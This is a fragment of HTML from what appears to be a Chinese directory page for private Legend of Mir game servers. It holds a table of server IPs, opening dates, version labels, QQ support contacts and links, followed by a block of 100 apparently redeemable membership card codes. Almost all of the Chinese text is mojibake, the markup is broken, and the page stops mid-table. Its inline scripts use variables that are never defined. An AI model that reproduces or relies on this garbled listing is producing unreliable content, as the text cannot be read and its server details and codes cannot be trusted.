		<span id="LeoBBSgg4"><font color="#ff0000"><b>
				<a name="14">���λ����:QQ818338</b></font></span></span><p align="center">
				��</td>
			</tr>
		</table>
		</a>
		</b></font></span></span></td>
	</tr>
</table>
<div align="center"><HEAD>

<BODY>
<DIV ALIGN="CENTER">
  <div align="center">
	<table width="924" border="0" id="table4">
		<tr borderColor="#ffffff" bgColor="#0000ff">
			<td width="82" height="14" style="font-size: 12px; color: #FFFFFF">
			�����������</td>
			<td width="97" style="font-size: 12px; color: #FFFFFF">������IP</td>
			<td width="179" style="font-size: 12px; color: #FFFFFF">����ʱ�� ��/��/��/ʱ</td>
			<td width="98" style="font-size: 12px; color: #FFFFFF">��·���</td>
			<td width="109" style="font-size: 12px; color: #FFFFFF">�汾����</td>
			<td width="116" style="font-size: 12px; color: #FFFFFF">�ͷ�QQ</td>
			<td width="104" style="font-size: 12px; color: #FFFFFF">��ϸ����</td>
			<td width="105" style="font-size: 12px; color: #FFFFFF">�Ƽ��Ǽ�</td>
		</tr>
	</table>
	<table width="926" border="0" id="table5">
		<tr>
			<td class="style6" bgcolor="#FFFF00">
			<a href="http://www.mirlm.com">����һ��</a></td>
			<td class="style6" bgcolor="#FFFF00">218.92.240.21</td>
			<td class="style5" bgcolor="#FFFF00"><SCRIPT language=javascript><!--
function getFullYear(d){//d is a date object
yr=d.getYear();if(yr<1000)
yr+=1900;return yr;}
;document.write(""+getFullYear(today)+"��/"+isnMonths[today.getMonth()]+"/"+today.getDate()+"��/"+clck+""+clckh+"�㿪��");

//-->

</SCRIPT></td>
			<td class="style49 style6" bgcolor="#FFFF00">���յ��Ż���</td>
			<td class="style6" bgcolor="#FFFF00"><font color="#FF0000">ʢ��1.85<span class="style74">-�Ƽ�</span></font></td>
			<td class="style6" bgcolor="#FFFF00">�ͷ�QQ��100536146</td>
			<td class="style6" bgcolor="#FFFF00">
			<a class="style49" target="_blank" href="http://www.8899mir.com">����鿴</a><strong><img src="images/new.gif"></strong></td>
			<td class="style5" bgcolor="#FFFF00">������</td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6">
			�������</td>
			<td class="style6">218.92.240.10</td>
			<td class="style5">2005��/9��/17��/����12��30</td>
			<td class="style49 style6">�й�����</td>
			<td class="style6">��ʢ��1.8</td>
			<td class="style6">�ͷ�QQ��339222822</td>
			<td class="style6">
			<a class="style49" target="_blank" href="http://www.ld520mir.com/">����鿴</a><strong><img src="images/new.gif"></strong></td>
			<td class="style5"><b><font color="#FF0000">
			������</font></b></td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6">
			������˵</td>
			<td class="style6">218.92.240.28</td>
			<td class="style5"><span class="style5"><SCRIPT language=javascript><!--
function getFullYear(d){//d is a date object
yr=d.getYear();if(yr<1000)
yr+=1900;return yr;}
;document.write(""+getFullYear(today)+"��/"+isnMonths[today.getMonth()]+"/"+today.getDate()+"��/"+clck+""+clckh+"�㿪��");

//-->

</SCRIPT></span></td>
			<td class="style49 style6">���յ��Ż���</td>
			<td class="style6"><font color="#FF0000">ʢ��1.85<span class="style74">-�Ƽ�</span></font></td>
			<td class="style6">�ͷ�QQ��393377424</td>
			<td class="style6">
			<a class="style49" target="_blank" href="http://www.8899mir.com">����鿴</a><strong><img src="images/new.gif"></strong></td>
			<td class="style5"><b><font color="#FF0000">
			<a target="_blank" href="http://xxcq.6jh.com/">������</a></font></b></td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00">
			<a href="http://www.8899mir.com">�������</a></td>
			<td class="style6">218.92.240.19</td>
			<td class="style5"><SCRIPT language=javascript><!--
function getFullYear(d){//d is a date object
yr=d.getYear();if(yr<1000)
yr+=1900;return yr;}
;document.write(""+getFullYear(today)+"��/"+isnMonths[today.getMonth()]+"/"+today.getDate()+"��/"+clck+""+clckh+"�㿪��");

//-->

</SCRIPT></td>
			<td class="style49 style6">���յ��Ż���</td>
			<td class="style6"><font color="#FF0000">ʢ��1.8���Ͱ�<span class="style74">-�Ƽ�</span></font></td>
			<td class="style6">�ͷ�QQ��10737673</td>
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://mir.9jh.com/">����鿴</a><strong><img src="images/new.gif"></strong></td>
			<td class="style5">������</td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00">
			<b><font color="#FF0000">�߷�ʱ��</font></b></td>
			<td class="style6"><b><font color="#FF0000">218.92.240.29</font></b></td>
			<td class="style49"><b><font color="#FF0000">2005��7��29��20��00׼ʱ����</font></b></td>
			<td class="style49 style6"><b><font color="#FF0000">���յ��Ż���</font></b></td>
			<td class="style6"><b><font color="#FF0000">��ʢ��1.8��</font></b></td>
			<td class="style6"><font color="#FF0000">�ͷ�QQ��476820523</font></td>
			<td class="style6" bgColor="#ffff00">
			<b><a class="style49" target="_blank" href="http://www.cn8816.com">
			<font color="#FF0000">����鿴</font></a></b><font color="#FF0000"><strong><img src="images/new.gif"></strong></font></td>
			<td class="style5"><b><font color="#FF0000">������</font></b></td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://www.jzcq.8866.org">
			���ݴ���</a></td>
			<td class="style6">61.152.158.112</td>
			<td class="style49">2005��/6��/19��/����7�㿪��</td>
			<td class="style49 style6">�Ϻ�����</td>
			<td class="style6">��ʢ��1.8<span class="style74">-�Ƽ�</span></td>
			<td class="style6">�ͷ�QQ��309503597</td>
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://www.jzcq.8866.org">
			����鿴</a></td>
			<td class="style5">������</td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://www.110mir.com">��������</a></td>
			<td class="style6">221.231.121.12</td>
			<td class="style5"><span class="style49">2005��/6��/19��/����9�㿪��</span></td>
			<td class="style49 style6">�Ϻ�����</td>
			<td class="style6">��Խʢ��1.8<span class="style74">-�Ƽ�</span></td>
			<td class="style6">�ͷ�QQ��307623618</td>
			<td class="style6" bgColor="#ffff00">
			<a class="style49" target="_blank" href="http://www.110mir.com">����鿴</a></td>
			<td class="style5">������</td>
		</tr>
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			<td class="style6" bgColor="#ffff00" colspan="8">
			��100�Ŵ����Ա��ֵ����������ֵ��Ҫ�������QQ:550904824
			<p>
			��л�������ǵ���Ϸ[����һ��]����ʢ��1.85,�����ͼ�Ʒװ���������ǻ���õ�Ϊ����������¿���Աһ��!�����������ʹ�ã��������Ч!</p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%">
			<font color="#000080" size="4"><b>��������:</b></font></p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%"><b>
			<font color="#cc6600" size="4">��ʼ�ȼ�:40�� �;�Ʒװ��</font></b></p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%"><b>
			<font color="#cc6600" size="4">��Ϸ��:����һ��</font></b></p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%"><b>
			<font color="#cc6600" size="4">IP:218.92.240.21</font></b></p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%" align="left">������Ա����:
			</p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%" align="left">
			��һ�����ֵ�½��Ϸ��������Ϸ�������ƽ�����Ϸ��ϵͳ�Զ�����������40����������һ�׼�Ʒװ�����趨������������Ҫ�˳���Ϸ </p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%" align="left">�ڶ���������վ 
			<a href="http://m.fiq.cn/">http://m.fiq.cn/</a> 
			��д���Ա���ź���Ϸ�������Ƽ���֤���������Ա </p>
			<p style="MARGIN: 0px 10px; LINE-HEIGHT: 150%" align="left">
			��������������Ա�����������ҡ���Ϸ��������&quot;�����Ա&quot;���������ܺܶ��Ա���ܺͽ���߼���ͼ����õ�װ���� </p>
			<p>���:1041 ����(1): 7508D-Z1YA5-1I20X-K8M32-6ZD56<br>
			���:1040 ����(2): 3W4Z1-H37U5-LCX8Y-88HL2-B5V5R<br>
			���:1039 ����(3): 7N0AM-DVZ4V-48I8F-MTV6P-8Q519<br>
			���:1038 ����(4): UP842-YVDMP-23IUZ-V7TRH-79OI7<br>
			���:1037 ����(5): Y07GU-BUX2E-55HXN-S1UAX-V5UA2<br>
			���:1036 ����(6): A0UTN-96439-396YH-78J3Q-US13B<br>
			���:1035 ����(7): QRU4Z-YF97J-136W7-MU2G1-SVFN4<br>
			���:1034 ����(8): UPFZS-VA881-073AN-N3CSW-T9Y92<br>
			���:1033 ����(9): 55I4I-985ZR-9L57C-KPB34-4CKE8<br>
			���:1032 ����(10): 5BN59-T2FSI-0QT1R-3673B-H79D4<br>
			���:1031 ����(11): HO23K-427N7-557ME-7DOS5-3RQN8<br>
			���:1030 ����(12): HJ1Z3-6G84R-7163B-1XRX4-2689V<br>
			���:1029 ����(13): 216M8-OO1W2-VPFC6-F9059-5949J<br>
			���:1028 ����(14): 3L574-4TOTW-R3K9G-857BQ-1CYJ0<br>
			���:1027 ����(15): 3C43B-L9HHL-V7I8U-9548E-AYDTP<br>
			���:1026 ����(16): 8NMLB-15MRK-06QL8-J5ZU2-V8F3O<br>
			���:1025 ����(17): X0J8U-D6201-29OE5-5L7MX-T546H<br>
			���:1024 ����(18): 3E15D-I6K3O-WS31W-91Z0H-C8MD6<br>
			���:1023 ����(19): 0J95T-4SV0C-SRF4M-DXK98-C43R2<br>
			���:1022 ����(20): BLRZ5-6Z7UV-959C2-CQ625-A7KX0<br>
			���:1021 ����(21): F868B-3QUWL-V3E4U-90RP1-03R5P<br>
			���:1020 ����(22): I863U-68A6E-Q855P-9RF99-0OBXI<br>
			���:1019 ����(23): 19F5K-K4K87-5OBZ1-Y9P35-E0Q69<br>
			���:1018 ����(24): HELTU-35CQ2-X5I45-A8I4Y-G4163<br>
			���:1017 ����(25): DC304-OJ5QT-YG201-0009N-4X1NW<br>
			���:1016 ����(26): 39B7D-5CT85-W5H28-CO352-CP42R<br>
			���:1015 ����(27): G7H17-448G1-X1NY4-D731V-39SFF<br>
			���:1014 ����(28): B26EN-K1358-9HXGF-97FB6-AO300<br>
			���:1013 ����(29): ZL50L-X5JR8-E63Y2-5YGK5-WX679<br>
			���:1012 ����(30): IRQ57-KZQMF-QPM65-U88U9-03ABI<br>
			���:1011 ����(31): IJ503-KF3A7-U0K5D-YU55N-3M91W<br>
			���:1010 ����(32): V7ODJ-B8OK7-LE481-38BNO-70H08<br>
			���:1009 ����(33): 8ILP1-1Y28M-G1QX8-NR8E2-TV4JQ<br>
			���:1008 ����(34): 8O1DS-WBM9D-31364-4N05W-QFO6G<br>
			���:1007 ����(35): 9A364-YB548-GA97F-6HDJ5-6WCBZ<br>
			���:1006 ����(36): P8TOC-E3U34-4X96U-Q06VE-9M2FN<br>
			���:1005 ����(37): OWT6R-S69RB-1332K-IAVK7-LJ83F<br>
			���:1004 ����(38): VH793-1GC2T-EF501-5CHNN-69CMX<br>
			���:1003 ����(39): QH99E-Y7025-DY7J9-433T2-743A6<br>
			���:1002 ����(40): R2X8T-T6571-IR854-LZUOW-QPRTG<br>
			���:1001 ����(41): ZBV2C-KIAV4-TFT2U-80O2F-2WPT5<br>
			���:1000 ����(42): EYX16-30PIA-7ND7K-9O1ZU-9P2S1<br>
			���:999 ����(43): BT73K-24HLU-T00E1-Z6W3N-DX2L9<br>
			���:998 ����(44): 3OF39-211AK-T2TR7-T70M1-H8YG4<br>
			���:997 ����(45): 2H45S-FKF21-L42N5-V7D98-1743G<br>
			���:996 ����(46): SU0O7-VC05D-BS9U5-PG0OV-W72W2<br>
			���:995 ����(47): 7L694-72488-2CNKG-3864Q-UP0BZ<br>
			���:994 ����(48): 0QK76-36490-S0HL3-096U7-B9DR1<br>
			���:993 ����(49): D12E4-J71KU-50M41-8N675-A63Y9<br>
			���:992 ����(50): UXCV7-F7DJ0-IMH34-38Y28-Y8FD1<br>
			���:991 ����(51): C72DK-B8JWV-377F2-7097O-19QG9<br>
			���:990 ����(52): 1WY51-H12PO-OQLXY-T7DB3-0FRM6<br>
			���:989 ����(53): 665C6-8K710-H11T3-4768U-Y4J5C<br>
			���:988 ����(54): U6Q53-06097-C5M71-LL1FN-9PTX8<br>
			���:987 ����(55): 17U4K-42Z77-AT4QC-Y8F35-F9258<br>
			���:986 ����(56): HTOGZ-7LYWI-X1L9S-A4L90-GBH1M<br>
			���:985 ����(57): Y25U6-3573Y-T44U3-UG2TS-F0I2B<br>
			���:984 ����(58): IN1F2-5R836-WCK70-C1K04-M42N7<br>
			���:983 ����(59): 23BKB-K0554-9QH27-121LE-H4M55<br>
			���:982 ����(60): MD4J6-KSL00-8807J-XJIOU-442I1<br>
			���:981 ����(61): KWRR3-72F07-0I2H0-ZJ3BN-HI7KX<br>
			���:980 ����(62): 1W1L8-2F1LF-4U0Q6-031LY-283T3<br>
			���:979 ����(63): 382J7-3T121-75EVM-9I3WW-J07MF<br>
			���:978 ����(64): 0V1GE-3X1MO-62A9X-Z2K3G-AD81R<br>
			���:977 ����(65): 1306X-I9W92-4F2ZR-77KHB-9WC44<br>
			���:976 ����(66): 6992G-0SZU5-1418Z-F8U6K-7WA5S<br>
			���:975 ����(67): 73E79-74HOK-AJRXT-LQWM1-U5PXM<br>
			���:974 ����(68): I5DQ2-4U476-7H60B-943EL-HW85U<br>
			���:973 ����(69): C6Z5C-PSW34-6C528-VUBIF-34UAO<br>
			���:972 ����(70): 163G6-4QTPA-XXZ1J-W4YXU-3QNO1<br>
			���:971 ����(71): 8863Z-03W63-2NOU7-FQ34D-M6J7N<br>
			���:970 ����(72): 55S45-AFCAY-1X613-2FPDS-5VLI0<br>
			���:969 ����(73): 8BV89-WZ27J-FW017-H78C1-SNW6M<br>
			���:968 ����(74): QP10P-V781Y-1E353-4GK8S-7523B<br>
			���:967 ����(75): 7UP74-2UV57-4CVPF-6S6U5-UYA8Z<br>
			���:966 ����(76): Y507A-347E3-3I5CU-71P6D-9X7RN<br>
			���:965 ����(77): X3FZ7-2TTK1-487Q5-4894Y-U8HT3<br>
			���:964 ����(78): 6377G-19M4P-I5IS9-4U67J-7IW07<br>
			���:963 ����(79): PZ2EZ-0E883-CQE67-F4IQ1-6D724<br>
			���:962 ����(80): 5H65P-8368Z-16OII-46YR6-N64NC<br>
			���:961 ����(81): P8503-V4KG7-96731-2FY6M-W63N7<br>
			���:960 ����(82): P0H59-ZWIC2-D6ND6-5JXTA-TBK83<br>
			���:959 ����(83): 2R1T0-6AA24-NR6W8-9XW41-IU58O<br>
			���:958 ����(84): T6P72-899U6-1LDCZ-35V2J-SZI67<br>
			���:957 ����(85): 08B2L-5YY0T-QJ69E-80105-36WT8<br>
			���:956 ����(86): DY4ZZ-4XVIJ-8DB97-87A61-H8PHM<br>
			���:955 ����(87): I2KS7-Q75A0-8W2E4-E37OV-K3VVF<br>
			���:954 ����(88): J6T0Q-8JDQZ-ZBQTJ-CJQT7-IZMYD<br>
			���:953 ����(89): 6A20Q-S9U90-B8MJK-1SIHV-OM381<br>
			���:952 ����(90): M5R22-RSI46-91W70-2F803-QOUN7<br>
			���:951 ����(91): JKNKA-YK7GJ-BS7G7-HH6LD-4NY55<br>
			���:950 ����(92): U5N97-1LFJB-23AI4-61088-78GW2<br>
			���:949 ����(93): T27FM-0S2PV-3UGWF-3UKQ6-PUUZZ<br>
			���:948 ����(94): Q6T5B-DI42K-393M7-N1651-URW8O<br>
			���:947 ����(95): LYUJ6-91IBA-YP68L-46O57-50FME<br>
			���:946 ����(96): O6S34-VS767-FAPC1-NA9LN-9G10W<br>
			���:945 ����(97): 6E581-8U4AO-4I5V8-S8SDG-8ZJHQ<br>
			���:944 ����(98): L077P-VV8IY-Y693J-43JYS-PA80C<br>
			���:943 ����(99): N5033-XWX86-2VGEB-GUTA4-664LV<br>
			���:942 ����(100): O609X-7WLAI-036I6-25240-N98W4<br>
			996<br>
��</p>
			<p>��</td>
		</tr>
	</table>
	<table width="926" border="0" id="table11">
		<tr class="style52" borderColor="#ffffff" bgColor="#ffff00">
			
>